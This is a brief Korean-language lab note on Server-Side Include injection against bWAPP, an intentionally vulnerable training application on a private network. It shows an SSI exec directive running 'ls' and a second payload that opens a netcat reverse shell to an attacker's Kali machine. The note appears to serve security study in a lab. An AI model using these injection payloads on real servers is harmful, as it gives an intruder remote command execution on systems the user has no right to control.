# SSI\_Injection

응답을 위해서 서버에서 추가 실행되는 @ = ssi

`http://192.168.56.122/bWAPP/ssii.shtml`

### SSI 기본 문법

* 지시어:

예시:

```html
<!--#exec cmd="ls"-->
```

* "" 안에 Kali 로 접속하는 명령어를 넣을 수도 있다.

예시:

```html
<!--#exec cmd="nc 192.168.56.102 4444 -e /bin/bash"-->
```
